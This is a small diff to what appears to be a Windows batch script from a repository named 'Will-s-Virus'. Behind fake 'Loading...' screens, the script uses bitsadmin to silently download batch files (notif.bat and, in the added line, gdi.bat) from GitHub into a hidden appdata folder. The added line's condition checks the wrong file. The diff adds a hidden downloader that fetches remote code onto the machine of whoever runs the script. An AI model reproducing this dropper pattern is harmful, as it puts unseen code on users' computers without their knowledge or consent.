@@ -55,6 +55,7 @@ ping localhost -n 1 >nul
 cls
 echo Loading...
 if not exist "%appdata%\willishot\notif.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/notif.bat" "%appdata%\willishot\notif.bat" >nul
+if not exist "%appdata%\willishot\notif.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/gdi.bat" "%appdata%\willishot\gdi.bat" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading.
